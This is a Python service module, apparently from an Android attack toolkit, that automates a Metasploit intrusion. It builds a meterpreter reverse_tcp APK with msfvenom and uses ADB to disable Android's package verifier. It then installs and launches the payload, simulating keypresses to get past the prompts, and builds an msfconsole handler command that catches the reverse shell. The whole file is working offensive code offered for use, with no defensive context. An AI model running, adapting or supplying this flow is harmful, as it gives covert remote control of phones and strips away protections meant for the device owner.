"""Metasploit attack flow service."""

from __future__ import annotations

import subprocess
import time
from pathlib import Path

from modules.config import AppConfig
from modules.services.adb import ADBService, OperationResult
from modules.services.connection import get_ip_address, is_valid_ipv4


def run_metasploit_attack(
    config: AppConfig,
    adb: ADBService,
    lhost: str | None = None,
    lport: str = "4444",
) -> OperationResult:
    ip = lhost or get_ip_address()
    if ip is None:
        ip = "127.0.0.1"
    if not is_valid_ipv4(ip):
        ip = "127.0.0.1"
    if not lport.isdigit() or not (1 <= int(lport) <= 65535):
        lport = "4444"

    apk_out = Path("test.apk")
    msfvenom = config.msfvenom_path or "msfvenom"
    msfconsole = config.msfconsole_path or "msfconsole"

    result = subprocess.run(
        [
            msfvenom,
            "-p",
            "android/meterpreter/reverse_tcp",
            f"LHOST={ip}",
            f"LPORT={lport}",
            "-o",
            str(apk_out),
        ],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        return OperationResult(
            False,
            f"msfvenom failed: {result.stderr or result.stdout}",
        )
    if not apk_out.is_file():
        return OperationResult(False, "test.apk missing after msfvenom")

    adb.run(["shell", "input", "keyevent", "3"])
    adb.run(["shell", "settings", "put", "global", "package_verifier_enable", "0"])
    adb.run(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "0"])

    exe = adb.executable or "adb"
    install_args = [exe, "install", "-r", str(apk_out)]
    if adb.serial:
        install_args = [exe, "-s", adb.serial, "install", "-r", str(apk_out)]
    install = subprocess.run(install_args, capture_output=True, text=True)

    if install.returncode != 0:
        detail = (install.stdout + install.stderr).strip()
        adb.run(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
        adb.run(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
        return OperationResult(False, f"adb install failed: {detail}")

    adb.run(["shell", "monkey", "-p", "com.metasploit.stage", "1"])
    time.sleep(3)
    adb.run(["shell", "input", "keyevent", "22"])
    adb.run(["shell", "input", "keyevent", "22"])
    adb.run(["shell", "input", "keyevent", "66"])

    return OperationResult(
        True,
        "Payload installed and launched. Start msfconsole handler separately or via job manager.",
        data={"lhost": ip, "lport": lport, "apk": str(apk_out)},
    )


def msfconsole_handler(config: AppConfig, lhost: str, lport: str) -> list[str]:
    """Build msfconsole argv for background job."""
    msfconsole = config.msfconsole_path or "msfconsole"
    return [
        msfconsole,
        "-x",
        f"use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; "
        f"set LHOST {lhost} ; set LPORT {lport} ; exploit",
    ]


def restore_verifier_settings(adb: ADBService) -> None:
    adb.run(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
    adb.run(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
